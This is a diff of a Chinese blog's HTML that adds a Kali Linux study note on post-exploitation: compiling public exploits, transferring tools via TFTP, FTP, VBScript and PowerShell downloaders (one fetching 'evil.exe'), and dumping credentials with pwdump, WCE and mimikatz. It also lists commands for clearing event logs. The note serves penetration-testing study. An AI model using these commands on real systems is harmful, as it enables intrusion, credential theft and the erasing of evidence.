@@ -240,6 +240,541 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%90%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%98%B6%E6%AE%B5/" itemprop="url">Kali Linux笔记(二十九)：后漏洞利用阶段</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-17T20:05:52+08:00">
+                2019-12-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-选择和修改EXP"><a href="#1-选择和修改EXP" class="headerlink" title="1. 选择和修改EXP"></a>1. 选择和修改EXP</h4><ul>
+<li>网上公开的EXP代码<ul>
+<li>选择可信赖的EXP源（存在恶意黑客编造假的EXP，因为Shellcode都是十六进制）</li>
+<li>Exploit-db（官方维护的漏洞溢出代码库）</li>
+<li>SecurityFocus</li>
+<li>Searchsploit</li>
+<li>有能力修改EXP（Python、Perl、Ruby、C、C++….）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-选择和修改EXP"><a href="#2-选择和修改EXP" class="headerlink" title="2. 选择和修改EXP"></a>2. 选择和修改EXP</h4><ul>
+<li>646.c<ul>
+<li>类Unix环境下编译</li>
+<li>返回地址与我们的环境不止</li>
+<li>反弹shell硬编码了回连IP地址</li>
+<li>缓冲区偏移量与我们环境不符</li>
+<li>目标IP硬编码</li>
+</ul>
+</li>
+<li>646.c<ul>
+<li>Windows环境下编译</li>
+<li><strong><code>🔺命令：apt-get install mingw32 ▲ 2019.12.16 更改为apt-get install mingw-w64</code></strong></li>
+<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong></li>
+<li><strong><code>🔺命令：i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe</code></strong> ▲ 2019.12.16 更改为 i686-w64-mingw32-gcc 646.c -o s1.exe -lws2_32</li>
+<li><strong><code>🔺命令：wine sl.exe IP地址</code></strong></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>exploit脚本路径：/usr/share/exploitdb/exploits/windows/remote</code></pre></blockquote>
+<ul>
+<li>643.c<ul>
+<li>Linux环境下编译</li>
+<li><strong><code>🔺命令：gcc 643.c -o 643</code></strong></li>
+<li>Shellcode，偏移量，IP地址需要被替换</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-避免有害的EXP"><a href="#3-避免有害的EXP" class="headerlink" title="3. 避免有害的EXP"></a>3. 避免有害的EXP</h4><ul>
+<li>不同的EXP<ul>
+<li>不同的系统补丁</li>
+<li>软件版本</li>
+<li>不同的offset、Shellcode</li>
+</ul>
+</li>
+<li>扫描探测目标系统版本，搭建适当的测试环境<ul>
+<li>避免一锤子测试</li>
+</ul>
+</li>
+<li>修改公开的EXP满足不同环境需要<ul>
+<li>了解漏洞原理，修改溢出代码</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-后漏洞利用阶段（POST-EXPLOITATION）"><a href="#4-后漏洞利用阶段（POST-EXPLOITATION）" class="headerlink" title="4. 后漏洞利用阶段（POST EXPLOITATION）"></a>4. 后漏洞利用阶段（POST EXPLOITATION）</h4><ul>
+<li>上传工具（更好控制服务器）</li>
+<li>提权</li>
+<li>擦除攻击痕迹</li>
+<li>安装后门（进行长期的控制）<ul>
+<li>长期控制</li>
+<li>Dump密码</li>
+<li>内网渗透</li>
+</ul>
+</li>
+<li>后漏洞利用阶段<ul>
+<li>最大的挑战–防病毒软件（信息库进行匹配，软件会更新）</li>
+<li>使用合法远程控制软件</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-漏洞利用后阶段"><a href="#5-漏洞利用后阶段" class="headerlink" title="5. 漏洞利用后阶段"></a>5. 漏洞利用后阶段</h4><ul>
+<li>上传文件<ul>
+<li>持久控制</li>
+<li>扩大对目标系统的控制能力</li>
+</ul>
+</li>
+<li>Linux系统<ul>
+<li>netcat</li>
+<li>curl</li>
+<li>wget</li>
+</ul>
+</li>
+<li>Windows<ul>
+<li>缺少预装的下载工具</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-漏洞利用后阶段"><a href="#6-漏洞利用后阶段" class="headerlink" title="6. 漏洞利用后阶段"></a>6. 漏洞利用后阶段</h4><ul>
+<li>非交互式shell<ul>
+<li>类NC远程控制shell</li>
+<li>ftp 192.168.1.1（无法进行交互）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>nc监听下来的shell与本机的shell存在不同
+window xp安装ftp：appwiz.cpl → Add → IIS → FTP（可能需要安装光盘）</code></pre></blockquote>
+<h4 id="7-使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）"><a href="#7-使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）" class="headerlink" title="7. 使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）"></a>7. 使用TFTP传输文件（路由器OS更新，基于UDP，不支持身份验证）</h4><ul>
+<li>XP、2003默认安装</li>
+<li>Win7、2008需要单独添加（作为操作系统组件单独添加）</li>
+<li>经常被边界防火墙过滤</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：mkdir /tftp</code></strong></li>
+<li><strong><code>🔺命令：chown -R nobody /tftp</code></strong>（作为服务程序的权限，较低）</li>
+<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /tftp/</code></strong>（拷贝需要上传文件）</li>
+<li><strong><code>🔺命令：atftpd --daemon --port 69 /tftp</code></strong>（作为后端程序）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>需要把tftpd下所有文件，组属设置为nobody，才能被下载</code></pre></blockquote>
+<ul>
+<li>Windows<ul>
+<li><strong><code>🔺命令：tftp -i IP地址 get nc.exe</code></strong>  </li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>tasklist查看Window运行的进程（exe）
+klogger.exe记录键盘敲击的字符</code></pre></blockquote>
+<h4 id="8-利用FTP传输文件"><a href="#8-利用FTP传输文件" class="headerlink" title="8. 利用FTP传输文件"></a>8. 利用FTP传输文件</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：apt-get install pure-ftpd</code></strong></li>
+<li><strong><code>🔺命令：./ftp.sh</code></strong>（ftp配置文件）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">groupadd ftpgroup</span><br><span class="line">useradd -g ftpgroup -d /dev/null -s /etc ftpuser</span><br><span class="line">pure-pw useradd yuanfh -u ftpuser -d /ftphome</span><br><span class="line">pure-pw mkdb</span><br><span class="line">cd /etc/pure-ftpd/auth/</span><br><span class="line">ln -s ../conf/PureDB 60pdb</span><br><span class="line">mkdir -p /ftphome</span><br><span class="line">chown -R ftpuser:ftpgroup /ftphome/</span><br><span class="line">/etc/init.d/pure-ftpd restart</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Windows<ul>
+<li><strong><code>🔺命令：echo open IP地址 21&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo 用户&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo 密码&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo bin&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo GET whoami.exe&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo GET klogger.exe&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo bye&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：ftp -s:ftp.txt</code></strong></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>需要拷贝要上传的文件到ftp server的根目录下</code></pre></blockquote>
+<h4 id="9-使用VBSCRIPT传输文件"><a href="#9-使用VBSCRIPT传输文件" class="headerlink" title="9. 使用VBSCRIPT传输文件"></a>9. 使用VBSCRIPT传输文件</h4><ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cd /var/www/html/</code></strong></li>
+<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
+</ul>
+</li>
+<li>Windows<ul>
+<li>wget.vbs ▲ 2019.12.17 XP系统报错：Microsoft VBScript runtime error下标越界</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreatObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreatObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting,FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True)&gt;&gt;wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffter = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter+1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Windows  <ul>
+<li><strong><code>🔺命令：cscript wget.vbs http://IP地址/whoami.exe w.exe</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="10-使用POWERSHELL传输文件"><a href="#10-使用POWERSHELL传输文件" class="headerlink" title="10. 使用POWERSHELL传输文件"></a>10. 使用POWERSHELL传输文件</h4><ul>
+<li>Kali <ul>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cd /var/www/html/</code></strong></li>
+<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
+</ul>
+</li>
+<li>Windows<ul>
+<li>Wget.ps1 ▲2019.12.17报错：webclient.DownloadFile($url,$file)请求期间发生异常</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$storageDir = $pwd</span><br><span class="line">$webclient = New-Object System.Net.WebClient</span><br><span class="line">$url = &quot;http://IP地址/evil.exe&quot;</span><br><span class="line">$file = &quot;new-exploit.exe&quot;</span><br><span class="line">$webclient.DownloadFile($url,$file)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Windows<ul>
+<li><strong><code>🔺命令：powershell.exe -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File Wget.ps1</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="11-使用DEBUG传输文件"><a href="#11-使用DEBUG传输文件" class="headerlink" title="11. 使用DEBUG传输文件"></a>11. 使用DEBUG传输文件</h4><ul>
+<li>Debug（Windows3.1就有Debug这个命令）<ul>
+<li>汇编、反汇编</li>
+<li>16进制dump</li>
+<li>默认限制文本文件64K字节</li>
+</ul>
+</li>
+<li>upx压缩文件（对传输文件进行压缩，在Kali下压缩）</li>
+<li><strong><code>🔺命令：wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt</code></strong></li>
+<li><strong><code>🔺命令：debug&lt;123.hex</code></strong>  </li>
+<li><strong><code>🔺命令：copy 1.dll nc.exe</code></strong></li>
+</ul>
+<h4 id="12-抓包嗅探（只能抓请求本地服务的身份验证）"><a href="#12-抓包嗅探（只能抓请求本地服务的身份验证）" class="headerlink" title="12. 抓包嗅探（只能抓请求本地服务的身份验证）"></a>12. 抓包嗅探（只能抓请求本地服务的身份验证）</h4><ul>
+<li>Windows<ul>
+<li>Wireshark</li>
+<li>Omnipeek（图形化界面好，功能全）</li>
+<li>commview</li>
+<li>Sniffpass（只抓有密码的包，无论有无错密码，都会抓包）</li>
+</ul>
+</li>
+<li>Linux<ul>
+<li>Tcpdump</li>
+<li>Wireshark</li>
+<li>Dsniff（只抓密码的程序）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>   dsniff -h<br>   dsniff -i eth0</p>
+</blockquote>
+<h4 id="13-键盘记录"><a href="#13-键盘记录" class="headerlink" title="13. 键盘记录"></a>13. 键盘记录</h4><ul>
+<li>Keylogger（记录所有的键盘敲击）</li>
+<li>木马窃取（DarkComet-RAT）</li>
+</ul>
+<h4 id="14-本地缓存密码"><a href="#14-本地缓存密码" class="headerlink" title="14. 本地缓存密码"></a>14. 本地缓存密码</h4><ul>
+<li>浏览器缓存的密码<ul>
+<li>IE</li>
+<li>Firefox</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>Firefox：浏览器记住的密码：Preferences → Security → saved Logins → Show Passwords
+IE：Internet选项 → 内容 → 自动完成设置 → 管理密码
+Window7：运行 → appwiz.cpl → 控制面板 → 用户 → 凭据管理器</code></pre></blockquote>
+<ul>
+<li>网络密码</li>
+<li>无线密码</li>
+<li><a href="http://www.nirsoft.net（集成工具）" target="_blank" rel="noopener">http://www.nirsoft.net（集成工具）</a></li>
+</ul>
+<blockquote>
+<pre><code>Remote Desktop PassView 远程桌面显示，对rdp文件进行读取</code></pre></blockquote>
+<ul>
+<li>Dump SAM<ul>
+<li>Pwdump（可远程执行，需要IP，用户以及密码）</li>
+<li>/usr/share/windows-binaries/fgdump</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>操作系统不保存密码，只保存密码的哈希值，输入登陆密码的时候，操作系统组件会对输入的密码进行哈希运算，比对密码数据库的哈希值
+操作系统保存哈希值，有两个值，一个是LMHash，另一个是NTLMHash
+本地密码数据库：C：\WINDOWS\system32\config\SAM</code></pre></blockquote>
+<ul>
+<li>Dump SAM<ul>
+<li>PwDump.exe -h  </li>
+<li>PwDump.exe  -x localhost ▲ 2019.12.18对于64bit的操作系统，需要加-x参数</li>
+<li>保存搜到的文件上传Kali</li>
+</ul>
+</li>
+<li>ophcrack<ul>
+<li>load pwdump文件</li>
+</ul>
+</li>
+</ul>
+<h4 id="15-WINDOWS身份认证过程"><a href="#15-WINDOWS身份认证过程" class="headerlink" title="15. WINDOWS身份认证过程"></a>15. WINDOWS身份认证过程</h4><blockquote>
+<pre><code>身份验证组件：
+Windows NT Logon and Authentication Model
+WINLOGON.EXE → LAS AUTH API(LSASRV.DLL) → MSV1_0.DDL(NTLM AUTH PKG)
+
+身份验证方式：
+Localhost:
+明文cgarcia/密文pwd1 → h1=LMHash(&quot;pwd1&quot;)/h2=NTHash(&quot;pwd1&quot;) → cmp([h1,h2],SAM) → SAM DATABASE
+Network:
+1.The cleartxt password is not sent
+2.The NTLM protocol is used
+
+身份验证具体步骤：
+发送方
+1.cgarcia/pwd1
+2.lmhash=LMHash(&quot;pwd1&quot;)/nthash=NTHash(&quot;pwd2&quot;)
+3.Init connection
+5.R=f(lmhash/nthash,C)
+6.Sends cgarcia,R
+接受方
+4.Responds C=challenge random
+7.R&apos;=f(SAM[lmhash/nthash],C)
+8.R&apos;== R &gt;&gt;Access Grant/R&apos;&lt;&gt; R&gt;&gt;Access Denied(SAM Database)</code></pre></blockquote>
+<h4 id="16-WCE（WINDOWS-CREDENTIAL-EDITOR）"><a href="#16-WCE（WINDOWS-CREDENTIAL-EDITOR）" class="headerlink" title="16. WCE（WINDOWS CREDENTIAL EDITOR）"></a>16. WCE（WINDOWS CREDENTIAL EDITOR）</h4><ul>
+<li>/usr/share/windows-resources/wce（wce32.exe/wce64.exe/wce-universal.exe）</li>
+<li>需要管理员权限</li>
+<li><strong><code>🔺命令：wce-universal.exe -l</code></strong>（显示当前系统已经登陆的会话账号）</li>
+<li><strong><code>🔺命令：wce-universal.exe -lv</code></strong>（显示当前登陆会话的详细信息）</li>
+<li><strong><code>🔺命令：wce-universal.exe -d</code></strong> LUID（指定一个会话，然后删除）</li>
+<li><strong><code>🔺命令：wce-universal.exe -e</code></strong>（指定刷新时间，登陆信息）</li>
+<li><strong><code>🔺命令：wce-universal.exe -r</code></strong>（每隔5s重新刷新一次登陆信息）</li>
+<li><strong><code>🔺命令：wce-universal.exe -g password</code></strong>（计算LMHash和NTLMHash）</li>
+<li><strong><code>🔺命令：wce-universal.exe -w</code></strong>（从内存中读取Digest Authentication Package中存的明文密码）</li>
+<li><strong><code>🔺命令：wce-universal.exe -i LUID -s 登陆信息</code></strong>（进行交互式修改）</li>
+<li>LM/NT hash</li>
+</ul>
+<blockquote>
+<pre><code>PWDUMP是从SAM Database中读取信息，WCE是从内存中读取信息</code></pre></blockquote>
+<h4 id="17-WCE（WINDOWS-CREDENTIAL-EDITOR）"><a href="#17-WCE（WINDOWS-CREDENTIAL-EDITOR）" class="headerlink" title="17. WCE（WINDOWS CREDENTIAL EDITOR）"></a>17. WCE（WINDOWS CREDENTIAL EDITOR）</h4><ul>
+<li>从内存中读取LM/NTLM hash</li>
+<li>Digest Authentication Package</li>
+<li>NTLM Security Package</li>
+<li>Kerberos Security</li>
+<li>防止WCE攻击</li>
+<li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Package<ul>
+<li>kerberos</li>
+<li>msv1_0</li>
+<li>schannet</li>
+<li>wdigest（本地连接身份验证，被删除后，只允许单用户登陆）▲2019.12.19能单用户登陆</li>
+<li>tspka（远程连接身份验证）</li>
+<li>pku2u</li>
+</ul>
+</li>
+</ul>
+<h4 id="18-其他工具"><a href="#18-其他工具" class="headerlink" title="18. 其他工具"></a>18. 其他工具</h4><ul>
+<li><strong><code>🔺命令：pwdump locahost</code></strong></li>
+<li><strong><code>🔺命令：fgdump</code></strong>（/usr/share/windows-binaries/fgdump）<ul>
+<li>双击会生成3个文件（调用cachedump/pwdump）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：mimikatz.exe</code></strong>（/usr/share/windows-resources/minikatz）<ul>
+<li>::（同 -h）</li>
+<li>privilege::debug（提权到debug权限）</li>
+<li>sekurlsa::logonPasswords（查看当前已经在登陆状态的会话信息）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>sekurlsa
+1.kerberos域环境的账号密码信息
+2.wdigest本地环境的明文信息
+3.logonPassword登陆的所有信息
+4.minidump最小形式的dump
+5.pth hash值的形式登陆账号</code></pre></blockquote>
+<blockquote>
+<pre><code>process
+1.list列出当前进程表
+2.start/stop开启/结束一个进程
+3.suspend/resume挂起/冻结一个进程（杀毒软件）</code></pre></blockquote>
+<blockquote>
+<pre><code>lsadump
+1.sam SAM数据库进行DUMP
+2.cache cache读取
+3.lsa las读取
+4.hash 哈希值读取</code></pre></blockquote>
+<blockquote>
+<pre><code>ts（终端服务）
+1.multirdp（打上补丁，允许多个用户进行登陆）</code></pre></blockquote>
+<blockquote>
+<pre><code>event
+1.drop（不再产生新的日志，登陆行为不会为记录在日志）
+2.clear（清楚操作系统安全性日志）
+3.eventvwr操作系统日志查看</code></pre></blockquote>
+<blockquote>
+<pre><code>Misc
+1.cmd（启动一个cmd）
+2.regedit（启动注册表）
+3.taskmgr（启动任务管理器）
+4.wifi（查看连接所有wifi的所有密码）</code></pre></blockquote>
+<blockquote>
+<pre><code>token
+1.whoami（whoami和sid）
+2.list（详细列出账号信息，名称，权限，SID）</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AB)%EF%BC%9ALinux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2787,277 +3322,6 @@ send 发包不收数据包</code></pre></blockquote>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%80)%EF%BC%9ANAMP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%80)%EF%BC%9ANAMP/" itemprop="url">Kali Linux笔记(二十一)：NMAP</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
-                2019-12-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  681 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-NMAP"><a href="#1-NMAP" class="headerlink" title="1. NMAP"></a>1. NMAP</h4><ul>
-<li>所有参数</li>
-<li>目标发现<ul>
-<li>-iL <inputfilename>（列表文件作为输入）</li>
-<li>-iR <num hosts>（随机选择目标进行扫描）</li>
-<li>–exclude &lt;host1[,host2]&gt;（扫描网址段不包含）</li>
-<li>–excludefile <exclude_file>（排除文件）</li>
-</ul>
-</li>
-<li>主机发现<ul>
-<li>-sL（不做扫描，列出地址段）</li>
-<li>-sn（ping扫描，不做端口扫描）</li>
-<li>-Pn（彻底扫描地址段，不回包也进行扫描）</li>
-<li>-PS/PA/PU/PY （TCP SYN/ACK，UDP or SCTP发现）</li>
-<li>-P0/PS/PE/PP/PM （Ping层的发现/SCTP发现/ICMP echo/时间戳/子网掩码发现）</li>
-<li>-n/-R （不做DNS解析/自动做反向解析）</li>
-<li>–dns-servers &lt;serv1[,serv2]&gt;（指定DNS解析服务器）</li>
-<li>–system-dns（操作系统默认的DNS解析服务器）</li>
-<li>–traceroute（扫描进行路由追踪）</li>
-</ul>
-</li>
-<li>端口发现<ul>
-<li>sS/sT/sA/sW/sM （TCP SYN/Connect()/ACK/Window/Maimon scans）</li>
-<li>sU （UDP扫描）</li>
-<li>sN/sF/sX （TCP Null，Fin and xmas scans）</li>
-<li>–scanflags <flags> （选择要扫描的flags）</li>
-<li>-sI &lt;zombie host[:probeport]&gt;（僵尸扫描）</li>
-<li>-sY/sZ （SCTP协议参数）</li>
-<li>-s0（IP扫描）</li>
-<li>-b <FTP relay host>（FTP中继扫描）</li>
-</ul>
-</li>
-<li>指定扫描端口<ul>
-<li>-p <port number> U → UDP T → TCP</li>
-<li>–exclude-ports <port ranges> （排除端口）</li>
-<li>-F （快速模式，比较少数量端口）</li>
-<li>-r （连续扫描端口，少于1000个端口）</li>
-<li>–top-ports <number> （扫描1000端口的前面端口）</li>
-<li>–port-ratio <ratio> （扫描更常见的端口）</li>
-</ul>
-</li>
-<li>服务/版本识别<ul>
-<li>-sV （服务特征库匹配）</li>
-<li>-sV –version-intensity <level> （扫描的深度、强度）</li>
-<li>-sV –version-light （intensity=2）</li>
-<li>-sV –version-all （intensity=9）</li>
-<li>-sV –version-trace（扫描过程进行跟踪）</li>
-</ul>
-</li>
-<li>脚本扫描<ul>
